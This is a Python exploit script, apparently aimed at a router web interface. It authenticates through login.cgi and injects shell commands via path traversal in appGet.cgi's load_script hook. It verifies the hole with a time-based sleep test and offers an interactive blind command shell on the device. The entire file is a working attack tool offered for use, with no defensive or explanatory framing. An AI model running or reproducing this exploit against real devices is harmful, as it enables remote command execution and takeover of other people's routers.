import requests
import sys
import urllib.parse
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Exploit():

    def __init__(self,target:str,user:str,password:str):
        self.cookie=''
        self.target=target
        self.user=user
        self.password=password
        self.cmd=''

    def RunCommand(self,cmd:str):
        self.GetLoginSession()
        payload=urllib.parse.quote(f'../bin/echo && ({cmd})')
        while True:
            try:
                StartTime=time.time()
                res = requests.get(
                    f'{self.target}/appGet.cgi?hook=load_script("{payload}")',
                    headers={
                        'Cookie': self.cookie,
                    },
                    verify=False
                )
                EndTime=time.time()
                break
            except:
                continue
        return EndTime-StartTime

    def ConnectionTest(self):
        res = requests.get(self.target,verify=False)
        return res.status_code == 200

    def GetLoginSession(self):
        login_authorization=f'{self.user}:{self.password}'
        login_authorization=base64.b64encode(login_authorization.encode('UTF-8')).decode('UTF-8')
        res = requests.post(
            f'{self.target}/login.cgi',
            data={
                'group_id':'',
                'action_mode':'',
                'action_script':'',
                'action_wait':5,
                'current_page':'Main_Login.asp',
                'next_page':'index.asp',
                'login_authorization':login_authorization
            },
            verify=False
        )
        if res.text=="<HTML><HEAD>\n<script>parent.location.href='/index.asp';</script>\n</HEAD></HTML>\n":
            self.cookie=res.headers['Set-Cookie']
            return True
        else:
            return False


    def CheckExploitPage(self):
        res = requests.get(
            f'{self.target}/appGet.cgi?hook=load_script("")',
            headers={
                'Cookie': self.cookie,
            },
            verify=False
        )
        return res.status_code == 200 and res.text=='{\n"load_script("")":""\n}\n'


    def CheckVulnerabilities(self):
        ExecuteTime=self.RunCommand('sleep 3')
        return ExecuteTime >= 3.0


    def run(self):
        # check target
        print('[*] Check whether the target can connect normally...')
        if self.ConnectionTest():
            print('[+] Ok.')
        else:
            print('[-] The target seems unable to connect :(')
            exit(0)

        # GetLoginSession()
        print('[*] Get login session...')
        if self.GetLoginSession():
            print('[+] Ok.')
        else:
            print('[-] Maybe the account or password is wrong :(')
            exit(0)

        # CheckExploitPage()
        print('[*] Check if the appGet.cgi page exists...')
        if self.CheckExploitPage():
            print('[+] Discover the appGet.cgi page !!')
        else:
            print('[-] The page does not exist and the vulnerability cannot be exploited :(')
            exit(0)

        # Check Vulnerabilities
        print('[*] Use time-based injection techniques to check for the existence of vulnerabilities...')
        if self.CheckVulnerabilities():
            print('[+] Weaknesses exist !')
        else:
            print('[-] The vulnerability does not exist and cannot be exploited :(')
            exit(0)


    def shell(self,cmd):
        return self.RunCommand(cmd)


def main():

    if len(sys.argv)<4:
        print(f'Usage:')
        print(f'\tCheck vulnerability:\t{sys.argv[0]} [target] [user] [password]')
        print(f'\tCommand execution:\t{sys.argv[0]} [target] [user] [password] shell')
        print(f'\nExample: {sys.argv[0]} http://192.168.1.1 "admin" "admin"')
        exit(0)

    Target=sys.argv[1]
    User=sys.argv[2]
    Password=sys.argv[3]

    exp=Exploit(Target,User,Password)

    if len(sys.argv)==5 and sys.argv[4]=='shell':
        cmd=''
        while True:
            cmd=input('shell> ')
            if cmd=='quit':
                print('Bye!')
                break
            print(f'Command running time : {exp.shell(cmd)}')
    else:
        exp.run()


if __name__ == '__main__':
    main()
